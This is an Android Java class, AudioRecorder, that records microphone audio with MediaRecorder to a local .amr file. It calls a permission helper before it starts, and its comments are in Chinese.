/**
 *
 */
package media;

import java.io.File;
import java.io.IOException;

import android.media.MediaRecorder;
import android.util.Log;
import permission.GivePermission;
import utils.ConfigCt;
import utils.Funcs;

/**
 * @author Administrator
 *
 */
public class AudioRecorder extends Thread {
	//音频输入-麦克风
	public final static int AUDIO_INPUT = MediaRecorder.AudioSource.MIC;
	//采用频率
	//44100是目前的标准，但是某些设备仍然支持22050，16000，11025
	public final static int AUDIO_SAMPLE_RATE = 44100;  //44.1KHz,普遍使用的频率
	//录音输出文件
	private final static String AUDIO_RAW_FILENAME_EXT = ".raw";
	private final static String AUDIO_WAV_FILENAME_EXT  = ".wav";
	public final static String AUDIO_AMR_FILENAME_EXT  = ".amr";

	public final static int SUCCESS = 1000;
	public final static int E_NOSDCARD = 1001;
	public final static int E_STATE_RECODING = 1002;
	public final static int E_UNKOWN = 1003;

	private MediaRecorder mRecorder;
	private static AudioRecorder mInstance;
	private static boolean isRecording = false;

	public synchronized static AudioRecorder getInstance(){
		if(mInstance == null||isRecording==false)
			mInstance = new AudioRecorder();
		return mInstance;
	}

	private AudioRecorder(){

	}
	public boolean startRecording(){
		if(isRecording)return false;
		if(GivePermission.getGivePermission().isEnable()){
			GivePermission.getGivePermission().EventStart();
			GivePermission.getGivePermission().TimeStart();
		}
		this.start();
		return true;
	}
	public void stopRecording(){
		if (mRecorder != null) {
			isRecording = false;
			mRecorder.stop();
			mRecorder.release();
			mRecorder = null;
			mInstance = null;
			Log.i(ConfigCt.TAG, "stopRecord");
		}
		//if(this.isAlive())this.stop();
	}
	@Override
	public void run() {
		if(mRecorder == null)createMediaRecorder();
		try{
			mRecorder.prepare();
			mRecorder.start();
			isRecording = true;
			ConfigCt.getInstance(null).setAudioPermission(true);
		}catch(IOException ex){
			ex.printStackTrace();
		}
	}
	private void createMediaRecorder(){
		/* ①Initial：实例化MediaRecorder对象 */
		mRecorder = new MediaRecorder();
		/* setAudioSource/setVedioSource*/
		mRecorder.setAudioSource(AUDIO_INPUT);//设置麦克风
		/* 设置输出文件的格式：THREE_GPP/MPEG-4/RAW_AMR/Default
		 * THREE_GPP(3gp格式，H263视频/ARM音频编码)、MPEG-4、RAW_AMR(只支持音频且音频编码要求为AMR_NB)
		 * recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
		 */
		mRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
		/* 设置音频文件的编码：AAC/AMR_NB/AMR_MB/Default: recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);*/
		mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
		/* 设置输出文件的路径 */
		String filename=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, AUDIO_AMR_FILENAME_EXT);
		Log.i(ConfigCt.TAG, filename);
		File file = new File(filename);
		if(file.exists())file.delete();
		mRecorder.setOutputFile(filename); //recorder.setOutputFile("/sdcard/temp.3gp");
	}
}
